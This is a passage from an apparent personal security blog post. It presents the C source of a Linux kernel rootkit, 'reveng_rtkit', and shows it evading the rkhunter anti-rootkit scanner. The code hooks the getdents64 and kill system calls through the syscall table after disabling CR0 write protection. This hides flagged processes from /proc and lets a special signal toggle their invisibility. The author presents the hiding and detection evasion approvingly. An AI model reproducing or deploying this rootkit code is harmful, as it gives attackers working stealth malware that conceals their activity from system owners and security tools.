			continue;
		}
		prev-&gt;d_reclen += dir-&gt;d_reclen;
	}
	else
	{
		prev = dir;
	}
	offset += dir-&gt;d_reclen;
}
</code></pre>
<p>The while loop goes through the <em>array of dirent</em> returned by getdents64 (or, in this context orig_getdents64).<br />
It checks whether.</p>
<ol>
  <li>The directory entry within the <em>array of dirent</em> is in <code>/proc/</code> directory</li>
  <li>It is invisible</li>
</ol>

<p>It then performs the changes to the <code>kdirent</code> then eventually to <code>dirent</code>, so that it can be passed to user space.</p>

<p>Whole Code (Test_hook_getdents64.h):</p>
<pre><code class="language-c">#include &lt;linux/syscalls.h&gt;     /* Needed to use syscall functions */
#include &lt;linux/slab.h&gt;         /* kmalloc(), kfree(), kzalloc() */
#include &lt;linux/sched.h&gt;        /* task_struct: Core info about all the tasks */
#include &lt;linux/fdtable.h&gt;      /* Open file table structure: files_struct structure */
#include &lt;linux/proc_ns.h&gt;	/* For `PROC_ROOT_INO` */

#include &lt;asm/ptrace.h&gt;		/* For intercepting syscall, struct named pt_regs is needed */


// =============================================================================

#include &lt;linux/dirent.h&gt;	/* struct dirent refers to directory entry. */

struct linux_dirent {
	unsigned long   d_ino;		/* inode number */
	unsigned long   d_off;		/* offset to the next dirent */
	unsigned short  d_reclen;	/* length of this record */
	char            d_name[1];	/* filename */
};

#define PF_INVISIBLE 0x10000000

#define HIDE_UNHIDE_PROCESS 32

// ==================================================================================

/* For storing read cr0 control register value
 *
 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
 *
 * unsigned long (*read_cr0)(void);
 */
unsigned long cr0;

// To store the address of the found sys_call_table
static unsigned long *__sys_call_table;

// Defining a function to store original syscalls
typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);

static tt_syscall orig_getdents64;
static tt_syscall orig_kill;


/* kprobe:
 * Acc. to: https://ish-ar.io/kprobes-in-a-nutshell/
 * 
 * Kprobes enables you to dynamically break into any kernel routine 
 * and collect debugging and performance information non-disruptively.
 *
 * Basically,we would use it as an alternative way to create a custom kallsyms_lookup_name function which can actually be exported to kernel (&gt;5.7) 
 */ 
#include &lt;linux/kprobes.h&gt;

/*
 * link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L75
 *
 * struct kprobe {
 *      ...
 *
 *      // Allow user to indicate symbol name of the probe point
 *      const char *symbol_name;
 *      ...
 *      }
 */

 static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"
  };

 /* For storing address of sys_call_table */

unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;

	//Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (&gt;5.7)
      
      /* // Lookup the address for a symbol. Returns 0 if not found.
      * unsigned long kallsyms_lookup_name(const char *name);
      * 
      */
      typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

      kallsyms_lookup_name_t kallsyms_lookup_name;
      register_kprobe(&amp;kp);
      kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
      unregister_kprobe(&amp;kp);

      syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
      return syscall_table;
}

/* Technique taken from: https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5. */

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *target_process = current;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
	* for loop macro
	* #define for_each_process(p) \
	* for (p = &amp;init_task ; (p = next_task(p)) != &amp;init_task ; )
	*/
	for_each_process(target_process)
	{
		if (target_process-&gt;pid == pid)
        	{
			return target_process;
	        }
	}
	return NULL;
}

static int is_invisible(pid_t pid)
{
	struct task_struct *task;

	if (!pid)
	{
		return 0;
	}

	task = find_task(pid);
	if (!task)
	{
		return 0;
	}
      
	if (task-&gt;flags &amp; PF_INVISIBLE)
	{
		return 1;
	}
	return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
{
	/* Dependent registers:
	 * rax: contains syscall ids = 0xd9
	 * rdi: which contains the file descriptor = unsigned int fd
	 * rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" =&gt; this pointer resides in user space
	 * rdx: length of the passed argument(or string) = unsigned int count
	 */

	// Storing file descriptor to uniquely identifies an open file 
	int fd = (int) pt_regs-&gt;di;

	/* User space related variable
	 * Storing the name of the file in a directory passed from user space via "si" register
	 */
	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs-&gt;si;

	int ret = orig_getdents64(pt_regs), err;

	// kernel space related variables
	unsigned short proc = 0;
	unsigned long offset = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

	//For storing the directory inode value
	struct inode *d_inode;

	if (ret &lt;= 0)
        	return ret;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
	 * 
	 * kzalloc - allocate memory. The memory is set to zero.
	 * @size: how many bytes of memory are required.
	 * @flags: the type of memory to allocate (see kmalloc).
	 *
	 * static inline void *kzalloc(size_t size, gfp_t flags)
	 */
	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
	 *
	 * Below is a brief outline of the most useful GFP flags
	 * %GFP_KERNEL
	 * Allocate normal kernel ram. May sleep.
	 */
	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	// Copying directory name (or pid name) from userspace to kernel space
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	// Storing the inode value of the required directory(or pid) 
	d_inode = current-&gt;files-&gt;fdt-&gt;fd[fd]-&gt;f_path.dentry-&gt;d_inode;

	if (d_inode-&gt;i_ino == PROC_ROOT_INO &amp;&amp; !MAJOR(d_inode-&gt;i_rdev)
        	/*&amp;&amp; MINOR(d_inode-&gt;i_rdev) == 1*/)
        	proc = 1;

	// Change which we will do
	while (offset &lt; ret)
	{
		dir = (void *)kdirent + offset;

		if ((proc &amp;&amp; is_invisible(simple_strtoul(dir-&gt;d_name, NULL, 10))))
		{
			if (dir == kdirent)
			{
				ret -= dir-&gt;d_reclen;
				memmove(dir, (void *)dir + dir-&gt;d_reclen, ret);
				continue;
			}
			prev-&gt;d_reclen += dir-&gt;d_reclen;
		}
        	else
		{
			prev = dir;
		}
		offset += dir-&gt;d_reclen;
	}
	// Copying directory name (or pid name) from kernel space to user space, after changing 
	err = copy_to_user(dirent, kdirent, ret);
      
	if (err)
	{
		goto out;
	}

	out:
		kfree(kdirent);
		return ret;
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	/* Dependent registers:
	* rax: contains syscall ids (normally) = 0x3e
	* rdi: which contains the file descriptor (normally) = pid_t pid (in this case)
	* rsi: which contains the passed arguments (normally) = int sig
	*/
	pid_t pid = (pid_t) pt_regs-&gt;di;
	int sig = (int) pt_regs-&gt;si;

	struct task_struct *task;
	switch (sig)
	{
        case HIDE_UNHIDE_PROCESS:
          if ((task = find_task(pid)) == NULL)
            return -ESRCH;
	  // Hiding/Unhiding process using XOR operation
          task-&gt;flags = task-&gt;flags ^ PF_INVISIBLE;
	  /*
	   * 0 = 1 ^ 1
	   * 1 = 1 ^ 0
	   */
          printk(KERN_INFO "[*] reveng_rtkit: Hiding/unhiding pid: %d \n", pid);
          break;
        default:
          return orig_kill(pt_regs);
      }
      return 0;
    }


    static inline void write_cr0_forced(unsigned long val)
    {
      unsigned long __force_order;

      asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
    }

    static inline void protect_memory(void)
    {
      printk(KERN_INFO "[*] reveng_rtkit: (Memory protected): Regainig normal memory protection\n");
      write_cr0_forced(cr0);	// Setting WP flag to 1 =&gt; read-only
    }

    static inline void unprotect_memory(void)
    {
      pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
      write_cr0_forced(cr0 &amp; ~0x00010000);	// Setting WP flag to 0 =&gt; writable
    }
</code></pre>
<p>Testing the Code:
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog14.png?raw=true" alt="" /></p>

<p>Let‚Äôs see how it performs with <strong><em>rkhunter</em></strong> antirootkit:</p>

<p><a href="https://asciinema.org/a/488606"><img src="https://asciinema.org/a/488606.svg" alt="asciicast" /></a></p>

<p>I have already explained about the reason behind that one warning in my github <a href="https://github.com/reveng007/reveng_rtkit#bypassing-rkhunter-antirootkit">README.md</a>.</p>

<h3 id="update-09112022">Update (09/11/2022):</h3>
<p>Please see this section in my repo: <a href="https://github.com/reveng007/reveng_rtkit#update">Update</a></p>

<p>The reason behind bypassing <strong><em>rkhunter</em></strong> antirootkit, is to hide our module from the <strong>list struct</strong>. Because when the <strong><em>rkhunter</em></strong> antirootkit is checking the circular doubly-linked list named, <strong>list</strong>, it is not getting the module name of our rootkit. But if we enable our rookit‚Äôs reveal options (which I have discussed in details in this blog), we can see that our rootkit is getting detected.</p>

<h3 id="note-6">NOTE:</h3>
<p>There is a catch when our rootkit is getting detected under revealing mode, you can see that, it is detecting our rookit under <ins>Diamophine rootkit tag</ins>.</p>

<p>It can happen due to the fact of applying the syscall interception technique from that project and the signature related to the syscall interception technique probably matched our rootkit.</p>

<!-- and also the fact, Diamorphine rootkit is famous, not mine! ;( -->

<blockquote>
  <p>But, one thing which became clear to me is that <strong><em>rkhunter</em></strong> antirootkit have small chunks of signatures of Diamorphine rootkit, probably each feature of Diamorphine rootkit corresponds to each unique signature. Proabably, some of those small signature chunks became similar to some of my rookit. I think, <strong><em>rkhunter</em></strong> antirootkit don‚Äôt have a whole complete signature of Diamorphine rootkit, or probably it has a whole complete signature of it, apart from those small chunks of signatures.</p>
</blockquote>

<p>But, as long as our rootkit is hidden, there is nothing to fear about ;).</p>

<p>With this, I have come to the end of the blog. I will be updating the blog as soon as I make some changes to my <code>reveng_rtkit</code>rootkit.
If you have any query, you can reach me at any of my social media. Till then, see yaa!</p>

    <hr>
<div class="post_navi"><a class="post_navi-item nav_prev" href="https://reveng007.github.io/blog/archive.html" title="Blog Archive">
    <div class="post_navi-arrow">&lt;</div><div class="post_navi-label">Blog Archive</div><div><span>Archive of all previous blog posts</span></div>
  </a><a class="post_navi-item nav_next" href="https://reveng007.github.io/blog/archive.html" title="Blog Archive">
    <div class="post_navi-arrow">&gt;</div><div class="post_navi-label">Blog Archive</div><div><span>Archive of all previous blog posts</span></div>
  </a></div>
  </div>

  <a class="u-url" href="/blog/2022/03/08/reveng_rkit_detailed.html" hidden></a>
</article>
      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/blog/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">reveng007&#39;s Blog</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">Soumyanil Biswas</li><li><a class="u-email" href="mailto:soumyanilbiswas2018@gmail.com">soumyanilbiswas2018@gmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/reveng007"><svg class="svg-icon"><use xlink:href="/blog/assets/minima-social-icons.svg#github"></use></svg> <span class="username">reveng007</span></a></li><li><a href="https://www.linkedin.com/in/soumyanil-biswas"><svg class="svg-icon"><use xlink:href="/blog/assets/minima-social-icons.svg#linkedin"></use></svg> <span class="username">soumyanil-biswas</span></a></li><li><a href="https://www.twitter.com/reveng007"><svg class="svg-icon"><use xlink:href="/blog/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">reveng007</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>My Blog Site</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
